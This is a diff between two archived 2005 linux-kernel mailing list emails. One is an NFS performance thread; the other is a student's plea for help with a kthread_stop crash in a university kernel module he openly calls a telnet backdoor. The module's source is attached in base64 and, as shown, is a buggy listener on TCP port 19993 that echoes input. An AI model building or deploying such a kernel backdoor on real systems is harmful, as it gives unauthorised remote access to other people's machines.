@@ -1,104 +1,120 @@
-Return-Path: <linux-kernel-owner+willy=40w.ods.org-S932150AbVJHPD1@vger.kernel.org>
+Return-Path: <linux-kernel-owner+willy=40w.ods.org-S932151AbVJHPEQ@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S932150AbVJHPD1 (ORCPT <rfc822;willy@w.ods.org>);
-	Sat, 8 Oct 2005 11:03:27 -0400
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S932151AbVJHPD1
+	id S932151AbVJHPEQ (ORCPT <rfc822;willy@w.ods.org>);
+	Sat, 8 Oct 2005 11:04:16 -0400
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S932153AbVJHPEQ
 	(ORCPT <rfc822;linux-kernel-outgoing>);
-	Sat, 8 Oct 2005 11:03:27 -0400
-Received: from xproxy.gmail.com ([66.249.82.204]:7476 "EHLO xproxy.gmail.com")
-	by vger.kernel.org with ESMTP id S932150AbVJHPD1 convert rfc822-to-8bit
-	(ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Sat, 8 Oct 2005 11:03:27 -0400
+	Sat, 8 Oct 2005 11:04:16 -0400
+Received: from zproxy.gmail.com ([64.233.162.196]:14414 "EHLO zproxy.gmail.com")
+	by vger.kernel.org with ESMTP id S932151AbVJHPEP (ORCPT
+	<rfc822;linux-kernel@vger.kernel.org>);
+	Sat, 8 Oct 2005 11:04:15 -0400
 DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
         s=beta; d=gmail.com;
-        h=received:message-id:date:from:reply-to:to:subject:cc:in-reply-to:mime-version:content-type:content-transfer-encoding:content-disposition:references;
-        b=S8mqEkfQA69j4RoTD0ptGD+/s3XCBpKrYOeD5gU5qlXGJjRkkO9pwC6Yu5lhcoDZskhBZc2TxeCEkwA9SLsNKy13VzofAShcFr23CxedCmblGG94nVekZL3fpxqd2f0ey+4Z/rlTbvsK7BAT5ElaNcXl9zDk5iDHZWAUHsFn/s4=
-Message-ID: <4ae3c140510080803x5e58e637u1ea91683628cbf67@mail.gmail.com>
-Date: Sat, 8 Oct 2005 11:03:26 -0400
-From: Xin Zhao <uszhaoxin@gmail.com>
-Reply-To: Xin Zhao <uszhaoxin@gmail.com>
-To: Willy Tarreau <willy@w.ods.org>
-Subject: Re: why is NFS performance poor when decompress linux kernel
-Cc: Lee Revell <rlrevell@joe-job.com>, linux-kernel@vger.kernel.org
-In-Reply-To: <4ae3c140510080735q5842d686u2f023b47f7930586@mail.gmail.com>
+        h=received:message-id:date:from:to:subject:mime-version:content-type;
+        b=qqKVGTAyIMTkuF0RVXq2CEUw9g+fr9lKjLXZFZiYHZBZz+jnqMkojvxH/dpi0VRVmeO89G5gbKPl03MTEBi1hqa+ijbLwC2D3iegiIBang3FzFQTTK58BoMp9O2ZFe3lzqWjVRHDtChgseWfiPIUVyVPQJWLSQudhbmJ8eOFg9s=
+Message-ID: <bac30fa90510080804n27f9264dm@mail.gmail.com>
+Date: Sat, 8 Oct 2005 12:04:14 -0300
+From: Redes II <redes2k@gmail.com>
+To: linux-kernel@vger.kernel.org
+Subject: kthread_stop give me an error (kernel 2.6.13 gentoo-sources)
 MIME-Version: 1.0
-Content-Type: text/plain; charset=US-ASCII
-Content-Transfer-Encoding: 7BIT
-Content-Disposition: inline
-References: <4ae3c140510072139n68b9b2eeyc0a400be32d958fe@mail.gmail.com>
-	 <1128751189.17981.62.camel@mindpipe>
-	 <20051008071936.GF22601@alpha.home.local>
-	 <4ae3c140510080735q5842d686u2f023b47f7930586@mail.gmail.com>
+Content-Type: multipart/mixed; 
+	boundary="----=_Part_2367_6952396.1128783854640"
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-BTW: where did you see that stat is called before each write? can you
-point out the code or function that does this? I might want to look
-into the source code to see whether we can improve it.
+------=_Part_2367_6952396.1128783854640
+Content-Type: text/plain; charset=ISO-8859-1
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: inline
 
-Thanks,
+Hi!!!
 
-Xin
+I'm trying to make a module for the university, on kernel 2.6.13.
 
-On 10/8/05, Xin Zhao <uszhaoxin@gmail.com> wrote:
-> I think the stat might be one reason. cuz when I do 'nfsstat', I
-> noticed that "getattr" and "setattr" are executed about 40000 times
-> while other operations are executed for less than 10000 times. That
-> gave me a feeling that some optimization can be considered to reduce
-> the getattr and setattr requests.
->
-> async and sync options affect write performance on large files more
-> significantly. But decompress kernel involves a lot of small files.
-> Because nfs will force data sync to disk before file close. async and
-> sync do not behave quite different.
->
-> Anyone has exeprience with NFS4? I don't know whether it improves in this parts
->
-> Xin
->
-> On 10/8/05, Willy Tarreau <willy@w.ods.org> wrote:
-> > Hi,
-> >
-> > On Sat, Oct 08, 2005 at 01:59:48AM -0400, Lee Revell wrote:
-> > > On Sat, 2005-10-08 at 00:39 -0400, Xin Zhao wrote:
-> > > > I noticed that when doing large file copy or linux kernel compilation
-> > > > in a NFS direcotry, the performance is not bad compared to local disk
-> > > > filesystem such as ext2. However, if I do linux kernel tarball
-> > > > decompression on a NFS directory, the performance is much worse than
-> > > > local disk filesystem (over 3 times slower). Anybody know the reason?
-> > >
-> > > Because NFS requires all writes to be synchronous by default, and
-> > > uncompressing the kernel is the most write intensive of those three
-> > > operations.  Mount with the async option and the performance should be
-> > > closer to a local disk.  Obviously this is more dangerous.
-> >
-> > I don't agree with you, Lee. My NFS is mounted with async by default,
-> > and what takes the most time when extracting a kernel archive is that
-> > tar does a stat() on every file before writing it. And THAT stat()
-> > prevents writes from being buffered. A better solution might be to
-> > process several files in parallel (multi-process/multi-thread).
-> > Perhaps a project for a new tar ?
-> >
-> > Just for a test, I tried extracting multiple files in parallel. The
-> > method is completely crappy, but I could saturate my NFS server this
-> > way :
-> >
-> > $ tar ztf /tmp/linux-2.6.9.tar.gz >/tmp/file-list
-> > $ sed -n '1~4p' < /tmp/file-list >/tmp/file-list1
-> > $ sed -n '2~4p' < /tmp/file-list >/tmp/file-list2
-> > $ sed -n '3~4p' < /tmp/file-list >/tmp/file-list3
-> > $ sed -n '4~4p' < /tmp/file-list >/tmp/file-list4
-> >
-> > $ tar zxf /tmp/linux-2.6.9.tar.gz -T /tmp/file-list1 & tar zxf /tmp/linux-2.6.9.tar.gz -T /tmp/file-list2 & tar zxf /tmp/linux-2.6.9.tar.gz -T /tmp/file-list3 & tar zxf /tmp/linux-2.6.9.tar.gz -T /tmp/file-list4 & wait
-> >
-> > OK, it finally took more time, although the server was saturated (maybe
-> > it crawled under seeks at the end, I did not check). This may constitute
-> > a starting point for people having more time to research in this area.
-> >
-> > > Lee
-> >
-> > Cheers,
-> > Willy
-> >
-> >
->
+
+Its a Backdoor - telnet......
+but when i try to unload the module, kthread_stop give me this error:
+
+Unable to handle kernel NULL pointer dereference at virtual address 0000000=
+0
+
+
+i attached the code....
+
+
+Help Me!!!!
+Sebastian
+
+Sorry for my bad English.
+
+------=_Part_2367_6952396.1128783854640
+Content-Type: text/x-csrc; name="backdoor.c"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="backdoor.c"
+
+I2luY2x1ZGUgPGxpbnV4L2tlcm5lbC5oPgojaW5jbHVkZSA8bGludXgvaW5pdC5oPgojaW5jbHVk
+ZSA8bGludXgvbW9kdWxlLmg+CiNpbmNsdWRlIDxuZXQvdGNwLmg+CiNpbmNsdWRlIDxsaW51eC9r
+dGhyZWFkLmg+CgojZGVmaW5lIFBPUlQgMTk5OTMKI2RlZmluZSBNQVggMTAwMApNT0RVTEVfREVT
+Q1JJUFRJT04oIkJhY2tkb29yIE1vZHVsZSIpOwpNT0RVTEVfQVVUSE9SKCJTZWJhcywgVXJ1Z3Vh
+eW8geSBRdWluY2hvIik7Ck1PRFVMRV9MSUNFTlNFKCIkTElDRU5TRSQiKTsKCnZvaWQqIHRocmVh
+ZCAodm9pZCopOwppbnQgcmVjdmZyb21fYmFja2Rvb3Ioc3RydWN0IHNvY2tldCAqc29jaywgc3Ry
+dWN0IHNvY2thZGRyX2luICphZGRyLCB1bnNpZ25lZCBjaGFyICpidWYpOwppbnQgc2VuZHRvX2Jh
+Y2tkb29yIChzdHJ1Y3Qgc29ja2V0ICpzb2NrLCBzdHJ1Y3Qgc29ja2FkZHJfaW4gKnRvLCB1bnNp
+Z25lZCBjaGFyICpidWYsaW50IGxlbik7CgpzdHJ1Y3QgdGFza19zdHJ1Y3QgKnA7CnN0cnVjdCBz
+b2NrZXQgKnNvY2ssICpuZXdzb2NrOwoKc3RhdGljIGludCBiYWNrZG9vcl9pbml0X21vZHVsZSh2
+b2lkKQp7Ci8vCWludCBhdXg7Ci8vCWF1eCA9IGtlcm5lbF90aHJlYWQgKCZ0aHJlYWQsTlVMTCxD
+TE9ORV9LRVJORUwpOwoJcCA9IGt0aHJlYWRfY3JlYXRlICh0aHJlYWQsMCwiQmFja2Rvb3IiKTsK
+CXdha2VfdXBfcHJvY2VzcyAocCk7CglwcmludGsoIk1vZHVsZSBiYWNrZG9vciBpbml0XG4iICk7
+CglyZXR1cm4gMDsKfQoKc3RhdGljIHZvaWQgYmFja2Rvb3JfZXhpdF9tb2R1bGUodm9pZCkKewoJ
+Cglzb2NrX3JlbGVhc2UgKHNvY2spOwoJc29ja19yZWxlYXNlIChuZXdzb2NrKTsKCWt0aHJlYWRf
+c3RvcCAocCk7CglwcmludGsgKCJDZXJybyBTb2NrZXRcblxuXG4iKTsKCXByaW50ayggS0VSTl9E
+RUJVRyAiTW9kdWxlIGJhY2tkb29yIGV4aXRcbiIgKTsKCn0KCgoKCnZvaWQqIHRocmVhZCAodm9p
+ZCogZ2cpewoJaW50IFNvY2tldFNlcnYsIGVycjsKCXN0cnVjdCBzb2NrYWRkcl9pbiBzZXJ2YWRk
+cjsKCWNoYXIgYnVmZiBbTUFYXTsKCXVuc2lnbmVkIHNob3J0IHB1ZXJ0bzsKCWludCBieXRlczsK
+CW5ld3NvY2sgPSBOVUxMOwoJcHVlcnRvID0gUE9SVDsKCWlmICgoU29ja2V0U2VydiA9IHNvY2tf
+Y3JlYXRlIChQRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1AsJnNvY2spKTwgMCkKCQlw
+cmludGsgKCJob2xhMyIpOwoJbWVtc2V0KCZzZXJ2YWRkciwgMCwgc2l6ZW9mKHNlcnZhZGRyKSk7
+CglzZXJ2YWRkci5zaW5fZmFtaWx5ID0gQUZfSU5FVDsKCXNlcnZhZGRyLnNpbl9hZGRyLnNfYWRk
+ciA9IElOQUREUl9BTlk7CglzZXJ2YWRkci5zaW5fcG9ydCA9IGh0b25zKHB1ZXJ0byk7Cglwcmlu
+dGsgKCIgY3JlbyBzb2NrZXRcbiIpOwoJaWYgKChlcnI9c29jay0+b3BzLT5iaW5kIChzb2NrLCAo
+c3RydWN0IHNvY2thZGRyICopICZzZXJ2YWRkciwgc2l6ZW9mKHNlcnZhZGRyKSkpPDApewoJCXBy
+aW50aygiRXJyb3IgZW4gYmluZCAlZFxuIiwgZXJyKTsKCQkvL3JldHVybiAtMTsKCX0KCWlmIChz
+b2NrLT5vcHMtPmxpc3Rlbihzb2NrLDUpPDApewoJCXByaW50aygiRXJyb3IgZW4gbGlzdGVuXG4i
+KTsKCQkvL3JldHVybiAtMTsKCX0KCXdoaWxlICgxKXsKCQlzb2NrX2NyZWF0ZSAoUEZfSU5FVCxT
+T0NLX1NUUkVBTSwgSVBQUk9UT19UQ1AsICZuZXdzb2NrKTsKCQluZXdzb2NrLT50eXBlID0gc29j
+ay0+dHlwZTsKCQluZXdzb2NrLT5vcHMgPSBzb2NrLT5vcHM7CgkJaWYgKChzb2NrLT5vcHMtPmFj
+Y2VwdChzb2NrLCBuZXdzb2NrLDAgKSkgPDApCgkJCXByaW50ayAoImVycm9yIGVuIGFjY2VwdFxu
+Iik7CgkJZWxzZXsKCQkJd2hpbGUgKChieXRlcz1yZWN2ZnJvbV9iYWNrZG9vciAobmV3c29jaywm
+c2VydmFkZHIsYnVmZikpID4yKXsKCQkJCXNlbmR0b19iYWNrZG9vciAobmV3c29jaywmc2VydmFk
+ZHIsYnVmZixieXRlcy0yKTsKCQkJfQoJCX0KCQlpZiAobmV3c29jay0+b3BzICE9IE5VTEwpewoJ
+CQlzb2NrX3JlbGVhc2UgKG5ld3NvY2spOwoJCQlwcmludGsgKCJDZXJybyBTb2NrZXQgbmV3c29j
+a1xuIik7CgkJfQoJfQoJCi8vCXNvY2tfcmVsZWFzZSAoc29jayk7Ci8vCXNvY2tfcmVsZWFzZSAo
+bmV3c29jayk7CglwcmludGsoIlRlcm1pbmEgdGhyZWFkXG4iKTsKCXJldHVybiAwOwp9IAoKaW50
+IHJlY3Zmcm9tX2JhY2tkb29yKHN0cnVjdCBzb2NrZXQgKnNvY2ssIHN0cnVjdCBzb2NrYWRkcl9p
+biAqYWRkciwgdW5zaWduZWQgY2hhciAqYnVmKQp7CglzdHJ1Y3QgbXNnaGRyIG1zZzsKICAgIAlz
+dHJ1Y3QgaW92ZWMgaW92OwogICAgCWludCBsZW47CiAgICAJbW1fc2VnbWVudF90IG9sZGZzOwoK
+ICAgIAlpZiAoc29jay0+c2s9PU5VTEwpIHJldHVybiAwOwoJCgltc2cubXNnX2ZsYWdzID0gMDsK
+ICAgIAltc2cubXNnX25hbWUgPSBhZGRyOwogICAgCW1zZy5tc2dfbmFtZWxlbiAgPSBzaXplb2Yo
+c3RydWN0IHNvY2thZGRyX2luKTsKICAgIAltc2cubXNnX2NvbnRyb2wgPSBOVUxMOwogICAgCW1z
+Zy5tc2dfY29udHJvbGxlbiA9IDA7CiAgICAJbXNnLm1zZ19pb3YgPSAmaW92OwogICAgCW1zZy5t
+c2dfaW92bGVuID0gMTsKICAgIAltc2cubXNnX2lvdi0+aW92X2Jhc2UgPSBidWY7IAkJLyogQnVm
+ZmVyIGRvbmRlIHNlIHJlY3YgbGEgaW5mbyAqLwogICAgCW1zZy5tc2dfaW92LT5pb3ZfbGVuID0g
+TUFYOyAJCS8qIENhcGFjaWRhZCBNYXhpbWEgZGVsIGJ1ZmZlciAqLwoJCglvbGRmcyA9IGdldF9m
+cygpOyBzZXRfZnMoS0VSTkVMX0RTKTsKICAgIAlsZW4gPSBzb2NrX3JlY3Ztc2coc29jaywmbXNn
+LDEwMjQsMCk7CiAgICAJc2V0X2ZzKG9sZGZzKTsKCSAgIAkKCXJldHVybiBsZW47Cn0KCgkKaW50
+IHNlbmR0b19iYWNrZG9vciAoc3RydWN0IHNvY2tldCAqc29jaywgc3RydWN0IHNvY2thZGRyX2lu
+ICp0bywgdW5zaWduZWQgY2hhciAqYnVmLGludCBsZW4pewoJCglzdHJ1Y3QgbXNnaGRyIG1zZzsK
+CXN0cnVjdCBpb3ZlYyBpb3Y7CiAJbW1fc2VnbWVudF90IG9sZGZzOwoJCglpZiAoc29jay0+c2s9
+PU5VTEwpIHJldHVybiAwOwoJCgltc2cubXNnX25hbWUgPSB0bzsKCW1zZy5tc2dfbmFtZWxlbiAg
+PSBzaXplb2Yoc3RydWN0IHNvY2thZGRyX2luKTsKCW1zZy5tc2dfZmxhZ3MgPSAwOwoJbXNnLm1z
+Z19jb250cm9sID0gTlVMTDsKCW1zZy5tc2dfY29udHJvbGxlbiA9IDA7Cgltc2cubXNnX2lvdiA9
+ICZpb3Y7Cgltc2cubXNnX2lvdmxlbiA9MTsKCW1zZy5tc2dfaW92LT5pb3ZfYmFzZSA9IGJ1ZjsJ
+CS8qIEJ1ZmZlciBhIGVudmlhciBxdWUgc2UgcGFzYSBwb3IgcGFyYW1ldHJvICovCgltc2cubXNn
+X2lvdi0+aW92X2xlbiA9IGxlbjsgCQkvKiBMYXJnbyBkZWwgYnVmZmVyIGEgZW52aWFyICovCgkK
+CW9sZGZzID0gZ2V0X2ZzKCk7IHNldF9mcyhLRVJORUxfRFMpOwoJbGVuID0gc29ja19zZW5kbXNn
+IChzb2NrLCZtc2csbGVuKTsKCXNldF9mcyhvbGRmcyk7CglyZXR1cm4gbGVuOwp9Cgptb2R1bGVf
+aW5pdChiYWNrZG9vcl9pbml0X21vZHVsZSk7Cm1vZHVsZV9leGl0KGJhY2tkb29yX2V4aXRfbW9k
+dWxlKTsK
+------=_Part_2367_6952396.1128783854640--
